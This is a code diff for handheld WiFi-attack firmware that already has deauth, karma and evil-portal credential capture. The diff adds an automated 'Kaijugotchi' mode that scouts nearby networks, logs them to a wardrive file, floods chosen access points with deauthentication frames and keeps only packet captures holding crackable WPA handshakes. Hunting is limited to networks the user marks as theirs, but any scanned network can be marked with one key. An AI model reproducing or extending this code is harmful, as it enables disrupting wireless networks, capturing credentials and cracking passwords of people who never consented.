@@ -20,7 +20,7 @@ const char *const MENU_ITEMS[] = {"WiFi", "BLE", "RF 433MHz", "NRF24 2.4GHz", "I
 constexpr int MENU_COUNT = sizeof(MENU_ITEMS) / sizeof(MENU_ITEMS[0]);
 constexpr int WIFI_ITEM = 0;
 
-const char *const WIFI_TOOLS[] = {"Scan networks", "Channel analyzer", "Packet sniffer", "Beacon spam", "Deauth flood", "Karma", "Handshake capture", "Evil portal", "Portal creds"};
+const char *const WIFI_TOOLS[] = {"Scan networks", "Channel analyzer", "Packet sniffer", "Beacon spam", "Deauth flood", "Karma", "Handshake capture", "Evil portal", "Portal creds", "Kaijugotchi"};
 constexpr int WIFI_TOOL_COUNT = sizeof(WIFI_TOOLS) / sizeof(WIFI_TOOLS[0]);
 constexpr int WIFI_TOOL_SCAN = 0;
 constexpr int WIFI_TOOL_CHANNELS = 1;
@@ -31,6 +31,7 @@ constexpr int WIFI_TOOL_KARMA = 5;
 constexpr int WIFI_TOOL_HANDSHAKE = 6;
 constexpr int WIFI_TOOL_PORTAL = 7;
 constexpr int WIFI_TOOL_CREDS = 8;
+constexpr int WIFI_TOOL_AUTO = 9;
 
 constexpr int WIFI_VISIBLE_ROWS = 8;
 constexpr int CH_FIRST = 1;
@@ -39,7 +40,7 @@ constexpr uint32_t CH_DWELL_MS = 300;
 constexpr int BAR_BASE_Y = 108;
 constexpr int BAR_MAX_H = 72;
 
-enum class Screen { Menu, Placeholder, WifiMenu, WifiScan, WifiChannels, WifiSniff, WifiSpamSelect, WifiSpamText, WifiSpamRun, WifiDeauthSelect, WifiDeauthCheck, WifiDeauthRun, WifiKarmaRun, WifiHsRun, WifiPortalRun, WifiCredsFiles, WifiCredsView };
+enum class Screen { Menu, Placeholder, WifiMenu, WifiScan, WifiChannels, WifiSniff, WifiSpamSelect, WifiSpamText, WifiSpamRun, WifiDeauthSelect, WifiDeauthCheck, WifiDeauthRun, WifiKarmaRun, WifiHsRun, WifiPortalRun, WifiCredsFiles, WifiCredsView, WifiAutoRun };
 
 Screen screen = Screen::Menu;
 int selected = 0;
@@ -1041,6 +1042,50 @@ const char *verdictTag(PmfVerdict v) {
     }
 }
 
+constexpr int OWN_MAX = 32;
+constexpr char OWN_PATH[] = "/kaiju/own_bssid.txt";
+uint8_t ownBssid[OWN_MAX][6];
+int ownCount = 0;
+
+bool isOwnBssid(const uint8_t *b) {
+    for (int i = 0; i < ownCount; i++) {
+        if (memcmp(ownBssid[i], b, 6) == 0) return true;
+    }
+    return false;
+}
+
+void loadOwnList() {
+    ownCount = 0;
+    if (!ensureSd() || !SD.exists(OWN_PATH)) return;
+    File f = SD.open(OWN_PATH, FILE_READ);
+    if (!f) return;
+    while (f.available() && ownCount < OWN_MAX) {
+        String line = f.readStringUntil('\n');
+        line.trim();
+        unsigned int b[6];
+        if (sscanf(line.c_str(), "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
+            for (int i = 0; i < 6; i++) ownBssid[ownCount][i] = static_cast<uint8_t>(b[i]);
+            ownCount++;
+        }
+    }
+    f.close();
+}
+
+void saveOwnList() {
+    if (!ensureSd()) return;
+    if (!SD.exists("/kaiju")) SD.mkdir("/kaiju");
+    if (SD.exists(OWN_PATH)) SD.remove(OWN_PATH);
+    File f = SD.open(OWN_PATH, FILE_WRITE);
+    if (!f) return;
+    for (int i = 0; i < ownCount; i++) {
+        char mac[18];
+        snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x", ownBssid[i][0], ownBssid[i][1], ownBssid[i][2],
+                 ownBssid[i][3], ownBssid[i][4], ownBssid[i][5]);
+        f.println(mac);
+    }
+    f.close();
+}
+
 enum ListPurpose : uint8_t { PURPOSE_DEAUTH, PURPOSE_HANDSHAKE, PURPOSE_PORTAL };
 ListPurpose listPurpose = PURPOSE_DEAUTH;
 
@@ -1074,8 +1119,10 @@ void drawDeauthSelect() {
             d.setTextColor(COLOR_PRIMARY, COLOR_BG);
         }
         const char *nm = dlSsid[idx][0] != '\0' ? dlSsid[idx] : "<hidden>";
+        char tagged[16];
+        snprintf(tagged, sizeof(tagged), "%c%s", isOwnBssid(dlBssid[idx]) ? '*' : ' ', nm);
         char line[48];
-        snprintf(line, sizeof(line), "%-12.12s %-6s %-4s ch%-2d %3d", nm, authLabel(dlAuth[idx]), rowTag(idx),
+        snprintf(line, sizeof(line), "%-12.12s %-6s %-4s ch%-2d %3d", tagged, authLabel(dlAuth[idx]), rowTag(idx),
                  dlChan[idx], dlRssi[idx]);
         d.drawString(line, 4, y);
     }
@@ -1508,7 +1555,15 @@ void stopHandshake() {
     hsRunning = false;
     esp_wifi_set_promiscuous(false);
     delay(20);
+    char path[64];
+    snprintf(path, sizeof(path), "/pcap/%s", pcapName);
+    bool crackable = hsMsgCount[2].load(std::memory_order_relaxed) > 0 &&
+                     (hsMsgCount[1].load(std::memory_order_relaxed) > 0 || hsMsgCount[3].load(std::memory_order_relaxed) > 0);
     stopPcap();
+    if (!crackable) {
+        if (SD.exists(path)) SD.remove(path);
+        snprintf(pcapMsg, sizeof(pcapMsg), "%s", "no crackable handshake: file removed");
+    }
 }
 
 void tickHandshake() {
@@ -1994,10 +2049,15 @@ void drawKarmaRun() {
     d.drawString("Enter run  H hop  ;. ch  Bksp back", 4, 124);
 }
 
+uint8_t karmaHostMac[6];
+int karmaHostCh = 0;
+
 void startKarmaHost(const KarmaReq &r) {
     stopKarmaSniff();
     snprintf(deauthSsid, sizeof(deauthSsid), "%s", r.ssid);
     deauthCh = r.ch;
+    memcpy(karmaHostMac, r.mac, 6);
+    karmaHostCh = r.ch;
     startPortal();
     if (!portalRunning) {
         snprintf(karmaLast, sizeof(karmaLast), "host failed: %s", portalLast);
@@ -2008,11 +2068,20 @@ void startKarmaHost(const KarmaReq &r) {
     karmaHostEnd = millis() + KARMA_HOST_MS;
     karmaHostCount++;
     snprintf(karmaLast, sizeof(karmaLast), "%s", r.ssid);
-    karmaLogAppend(r);
     drawKarmaRun();
 }
 
+void logKarmaHostIfUseful() {
+    if (portalCaptured == 0) return;
+    KarmaReq r;
+    memcpy(r.mac, karmaHostMac, 6);
+    r.ch = static_cast<uint8_t>(karmaHostCh);
+    snprintf(r.ssid, sizeof(r.ssid), "%s", deauthSsid);
+    karmaLogAppend(r);
+}
+
 void endKarmaHost() {
+    logKarmaHostIfUseful();
     stopPortal();
     karmaHosting = false;
     startKarmaSniff();
@@ -2036,6 +2105,7 @@ void startKarma() {
 void stopKarma() {
     if (!karmaRunning) return;
     if (karmaHosting) {
+        logKarmaHostIfUseful();
         stopPortal();
         karmaHosting = false;
     }
@@ -2081,6 +2151,320 @@ void tickKarma() {
     }
 }
 
+constexpr int AP_TABLE_MAX = 64;
+constexpr int AUTO_SSID_MAX = 32;
+constexpr uint32_t AUTO_SCOUT_MS = 30000;
+constexpr uint32_t AUTO_HUNT_MS = 90000;
+constexpr uint32_t AUTO_DEAUTH_MS = 30000;
+constexpr uint32_t AUTO_HOP_MS = 400;
+constexpr uint32_t AUTO_BURST_MS = 300;
+constexpr uint8_t AUTO_MAX_TRIES = 2;   // hunts per network per session
+constexpr char WARDRIVE_PATH[] = "/kaiju/wardrive.csv";
+
+struct ApRec {
+    uint8_t bssid[6];
+    char ssid[AUTO_SSID_MAX + 1];
+    uint8_t ch;
+    int8_t rssi;
+    uint8_t flags;
+    bool logged;
+    bool captured;
+    uint8_t tries;
+};
+ApRec apTable[AP_TABLE_MAX];
+std::atomic<int> apCount{0};
+
+enum class AutoStage : uint8_t { IDLE, SCOUT, HUNT };
+AutoStage autoStage = AutoStage::IDLE;
+uint32_t autoStageStart = 0;
+uint32_t autoLastHop = 0;
+uint32_t autoLastBurst = 0;
+uint32_t autoLastDraw = 0;
+uint32_t autoLastOkAt = 0;
+int autoHopCh = CH_FIRST;
+int autoTarget = -1;
+uint32_t autoCaptures = 0;
+char autoMsg[48] = "";
+char autoFile[40] = "";
+
+const char *authText(uint8_t f) {
+    if (!(f & CHK_RSN)) return "open";
+    if (f & CHK_SAE) return (f & CHK_PSK) ? "WPA2/3" : "WPA3";
+    return "WPA2";
+}
+
+void onAutoScout(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT) return;
+    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
+    uint32_t len = pkt->rx_ctrl.sig_len;
+    if (len < 40 || ((pkt->payload[0] >> 4) & 0xF) != 0x8) return;
+    const uint8_t *bssid = &pkt->payload[16];
+    int count = apCount.load(std::memory_order_relaxed);
+    int idx = -1;
+    for (int i = 0; i < count; i++) {
+        if (memcmp(apTable[i].bssid, bssid, 6) == 0) {
+            idx = i;
+            break;
+        }
+    }
+    if (idx < 0) {
+        if (count >= AP_TABLE_MAX) return;
+        idx = count;
+        memcpy(apTable[idx].bssid, bssid, 6);
+        apTable[idx].ssid[0] = '\0';
+        apTable[idx].flags = 0;
+        apTable[idx].logged = false;
+        apTable[idx].captured = false;
+        apTable[idx].tries = 0;
+        apCount.store(count + 1, std::memory_order_release);
+    }
+    uint32_t end = len - 4;
+    uint32_t q = 36;
+    if (apTable[idx].ssid[0] == '\0' && q + 2 <= end && pkt->payload[q] == 0) {
+        uint32_t n = pkt->payload[q + 1];
+        if (n > 0 && n <= AUTO_SSID_MAX && q + 2 + n <= end) {
+            memcpy(apTable[idx].ssid, &pkt->payload[q + 2], n);
+            apTable[idx].ssid[n] = '\0';
+        }
+    }
+    apTable[idx].ch = pkt->rx_ctrl.channel;
+    apTable[idx].rssi = pkt->rx_ctrl.rssi;
+    apTable[idx].flags |= parseBeaconFlags(pkt, len);
+}
+
+void autoLogNew() {
+    int count = apCount.load(std::memory_order_acquire);
+    int written = 0;
+    for (int i = 0; i < count && written < 3; i++) {
+        if (apTable[i].logged) continue;
+        apTable[i].logged = true;
+        written++;
+        char mac[18];
+        snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x", apTable[i].bssid[0], apTable[i].bssid[1],
+                 apTable[i].bssid[2], apTable[i].bssid[3], apTable[i].bssid[4], apTable[i].bssid[5]);
+        String line = String(static_cast<int>(millis() / 60000)) + "m, " + mac + ", " + apTable[i].ssid + ", ch" +
+                      String(static_cast<int>(apTable[i].ch)) + ", " + String(static_cast<int>(apTable[i].rssi)) +
+                      " dBm, " + authText(apTable[i].flags) + ", " + verdictTag(computeVerdict(apTable[i].flags));
+        appendCapped(WARDRIVE_PATH, line);
+    }
+}
+
+bool huntCrackable() {
+    uint32_t m1 = hsMsgCount[1].load(std::memory_order_relaxed);
+    uint32_t m2 = hsMsgCount[2].load(std::memory_order_relaxed);
+    uint32_t m3 = hsMsgCount[3].load(std::memory_order_relaxed);
+    return m2 > 0 && (m1 > 0 || m3 > 0);
+}
+
+int pickAutoTarget() {
+    int count = apCount.load(std::memory_order_acquire);
+    int best = -1;
+    for (int i = 0; i < count; i++) {
+        const ApRec &a = apTable[i];
+        if (a.captured || a.tries >= AUTO_MAX_TRIES || !(a.flags & CHK_SEEN)) continue;
+        if (!isOwnBssid(a.bssid)) continue;
+        if (!verdictAllowsDeauth(computeVerdict(a.flags))) continue;
+        if (best < 0 || a.rssi > apTable[best].rssi) best = i;
+    }
+    return best;
+}
+
+void stopAutoRadio() {
+    esp_wifi_set_promiscuous(false);
+}
+
+void startAutoScout() {
+    autoStage = AutoStage::SCOUT;
+    autoStageStart = millis();
+    autoLastHop = 0;
+    setAnalyzerChannel(autoHopCh);
+    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT};
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous_rx_cb(&onAutoScout);
+    esp_wifi_set_promiscuous(true);
+}
+
+void startAutoHunt(int idx) {
+    stopAutoRadio();
+    autoTarget = idx;
+    memcpy(deauthBssid, apTable[idx].bssid, 6);
+    snprintf(deauthSsid, sizeof(deauthSsid), "%s", apTable[idx].ssid);
+    deauthCh = apTable[idx].ch;
+    setAnalyzerChannel(deauthCh);
+    for (auto &c : hsMsgCount) c.store(0, std::memory_order_relaxed);
+    hsEapolTotal.store(0, std::memory_order_relaxed);
+    hsDataSeen.store(0, std::memory_order_relaxed);
+    hsBeaconSaved.store(false, std::memory_order_relaxed);
+    startPcap("auto");
+    if (!pcapActive.load(std::memory_order_acquire)) {
+        autoTarget = -1;
+        snprintf(autoMsg, sizeof(autoMsg), "no SD card: not hunting");
+        startAutoScout();
+        return;
+    }
+    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA};
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous_rx_cb(&onHandshake);
+    esp_wifi_set_promiscuous(true);
+    autoStage = AutoStage::HUNT;
+    autoStageStart = millis();
+    autoLastBurst = 0;
+    snprintf(autoMsg, sizeof(autoMsg), "hunting %.20s", deauthSsid);
+}
+
+void endAutoHunt(bool ok) {
+    stopAutoRadio();
+    delay(20);
+    char path[64];
+    snprintf(path, sizeof(path), "/pcap/%s", pcapName);
+    stopPcap();
+    if (ok) {
+        snprintf(autoFile, sizeof(autoFile), "%s", pcapName);
+        apTable[autoTarget].captured = true;
+        autoCaptures++;
+        autoLastOkAt = millis();
+        snprintf(autoMsg, sizeof(autoMsg), "got one: %.20s", deauthSsid);
+    } else {
+        if (SD.exists(path)) SD.remove(path);
+        apTable[autoTarget].tries++;
+        snprintf(autoMsg, sizeof(autoMsg), "no handshake: %.16s", deauthSsid);
+    }
+    autoTarget = -1;
+    startAutoScout();
+}
+
+void startKaijugotchi() {
+    attackRadio();
+    loadOwnList();
+    if (ensureSd() && !SD.exists("/kaiju")) SD.mkdir("/kaiju");
+    apCount.store(0, std::memory_order_relaxed);
+    autoCaptures = 0;
+    autoLastOkAt = 0;
+    autoFile[0] = '\0';
+    if (ensureSd()) {
+        snprintf(autoMsg, sizeof(autoMsg), "%s", "scouting");
+    } else {
+        snprintf(autoMsg, sizeof(autoMsg), "%s", "no SD card: nothing saved");
+    }
+    startAutoScout();
+}
+
+void stopKaijugotchi() {
+    if (autoStage == AutoStage::HUNT) {
+        char path[64];
+        snprintf(path, sizeof(path), "/pcap/%s", pcapName);
+        stopAutoRadio();
+        delay(20);
+        stopPcap();
+        if (SD.exists(path)) SD.remove(path);
+    } else if (autoStage == AutoStage::SCOUT) {
+        stopAutoRadio();
+    }
+    autoStage = AutoStage::IDLE;
+    autoTarget = -1;
+    snprintf(autoMsg, sizeof(autoMsg), "%s", "stopped");
+}
+
+void drawKaijugotchi() {
+    auto &d = M5Cardputer.Display;
+    d.fillScreen(COLOR_BG);
+    uint32_t now = millis();
+    const char *stage = autoStage == AutoStage::HUNT ? "HUNTING" : (autoStage == AutoStage::SCOUT ? "SCOUTING" : "READY");
+    const char *face = autoStage == AutoStage::HUNT ? "(>_<)" : (autoStage == AutoStage::SCOUT ? "(o_o)" : "(-_-)");
+    if (autoLastOkAt != 0 && now - autoLastOkAt < 5000) face = "(^o^)";
+    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
+    d.setTextSize(2);
+    d.drawString(stage, 6, 4);
+    d.drawString(face, 150, 4);
+    d.setTextSize(1);
+    char line[64];
+    int seen = apCount.load(std::memory_order_relaxed);
+    int mine = 0;
+    for (int i = 0; i < seen; i++) {
+        if (isOwnBssid(apTable[i].bssid)) mine++;
+    }
+    snprintf(line, sizeof(line), "Networks seen %d   yours %d", seen, mine);
+    d.drawString(line, 4, 26);
+    snprintf(line, sizeof(line), "Handshakes saved %lu", (unsigned long)autoCaptures);
+    d.drawString(line, 4, 38);
+    if (autoStage == AutoStage::HUNT) {
+        uint32_t elapsed = (now - autoStageStart) / 1000;
+        long left = static_cast<long>(AUTO_HUNT_MS / 1000) - static_cast<long>(elapsed);
+        if (left < 0) left = 0;
+        snprintf(line, sizeof(line), "%.14s ch%d  %lds left", deauthSsid, deauthCh, left);
+    } else if (autoFile[0] != '\0' && autoCaptures > 0) {
+        snprintf(line, sizeof(line), "%s", autoFile);
+    } else {
+        snprintf(line, sizeof(line), "%s", autoMsg);
+    }
+    d.drawString(line, 4, 50);
+    uint32_t total = autoStage == AutoStage::HUNT ? AUTO_HUNT_MS : (autoStage == AutoStage::SCOUT ? AUTO_SCOUT_MS : 1);
+    uint32_t progressed = autoStage == AutoStage::IDLE ? 0 : (now - autoStageStart);
+    if (progressed > total) progressed = total;
+    int fill = static_cast<int>(progressed * 230 / total);
+    d.drawRect(4, 64, 232, 8, COLOR_SECONDARY);
+    if (fill > 0) d.fillRect(5, 65, fill, 6, COLOR_PRIMARY);
+    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
+    if (ownCount == 0) {
+        d.drawString("Nothing marked yet: passive only.", 4, 78);
+        d.drawString("WiFi > Deauth flood, press O on yours.", 4, 88);
+    } else {
+        d.drawString("Hunting only the networks you marked.", 4, 78);
+    }
+    d.drawString("Enter start/stop  Bksp back", 4, 124);
+}
+
+void tickKaijugotchi() {
+    if (autoStage == AutoStage::IDLE) return;
+    uint32_t now = millis();
+    if (autoStage == AutoStage::SCOUT) {
+        if (now - autoLastHop >= AUTO_HOP_MS) {
+            autoLastHop = now;
+            autoHopCh = autoHopCh >= CH_LAST ? CH_FIRST : autoHopCh + 1;
+            setAnalyzerChannel(autoHopCh);
+        }
+        autoLogNew();
+        if (now - autoStageStart >= AUTO_SCOUT_MS) {
+            int t = pickAutoTarget();
+            if (t >= 0 && ensureSd()) {
+                startAutoHunt(t);
+            } else {
+                autoStageStart = now;
+            }
+        }
+    } else if (autoStage == AutoStage::HUNT) {
+        if (now - autoLastBurst >= AUTO_BURST_MS && now - autoStageStart < AUTO_DEAUTH_MS) {
+            autoLastBurst = now;
+            deauthBurst();
+        }
+        if (huntCrackable()) {
+            endAutoHunt(true);
+        } else if (now - autoStageStart >= AUTO_HUNT_MS) {
+            endAutoHunt(false);
+        }
+    }
+    if (now - autoLastDraw >= 1000) {
+        autoLastDraw = now;
+        drawKaijugotchi();
+    }
+}
+
+void toggleOwn(int idx) {
+    for (int i = 0; i < ownCount; i++) {
+        if (memcmp(ownBssid[i], dlBssid[idx], 6) == 0) {
+            for (int j = i + 1; j < ownCount; j++) memcpy(ownBssid[j - 1], ownBssid[j], 6);
+            ownCount--;
+            saveOwnList();
+            return;
+        }
+    }
+    if (ownCount < OWN_MAX) {
+        memcpy(ownBssid[ownCount], dlBssid[idx], 6);
+        ownCount++;
+    }
+    saveOwnList();
+}
+
 bool wordHas(const std::vector<char> &word, char c) {
     for (char w : word) {
         if (tolower(w) == c) return true;
@@ -2120,6 +2504,7 @@ void loop() {
         tickHandshake();
     }
     if (screen == Screen::WifiPortalRun) tickPortal();
+    if (screen == Screen::WifiAutoRun) tickKaijugotchi();
     if (!M5Cardputer.Keyboard.isChange() || !M5Cardputer.Keyboard.isPressed()) return;
 
     auto &ks = M5Cardputer.Keyboard.keysState();
@@ -2191,6 +2576,9 @@ void loop() {
                 screen = Screen::WifiDeauthSelect;
                 listPurpose = PURPOSE_HANDSHAKE;
                 enterScanList();
+            } else if (wifiToolSel == WIFI_TOOL_AUTO) {
+                screen = Screen::WifiAutoRun;
+                drawKaijugotchi();
             } else if (wifiToolSel == WIFI_TOOL_CREDS) {
                 screen = Screen::WifiCredsFiles;
                 scanCredsFiles();
@@ -2351,6 +2739,11 @@ void loop() {
             moveDeauthSelection(1);
         } else if (wordHas(ks.word, 'r')) {
             if (dlCount > 0) startPmfPass();
+        } else if (wordHas(ks.word, 'o')) {
+            if (dlCount > 0) {
+                toggleOwn(dlSel);
+                drawDeauthSelect();
+            }
         } else if (ks.enter) {
             if (dlCount > 0) {
                 chooseDeauthTarget();
@@ -2484,6 +2877,20 @@ void loop() {
         } else if (down) {
             if (credsEntrySel < credsEntryCount - 1) credsEntrySel++;
             drawCredsView();
+        }
+        break;
+    case Screen::WifiAutoRun:
+        if (back) {
+            stopKaijugotchi();
+            screen = Screen::WifiMenu;
+            drawWifiMenu();
+        } else if (ks.enter) {
+            if (autoStage == AutoStage::IDLE) {
+                startKaijugotchi();
+            } else {
+                stopKaijugotchi();
+            }
+            drawKaijugotchi();
         }
         break;
     }
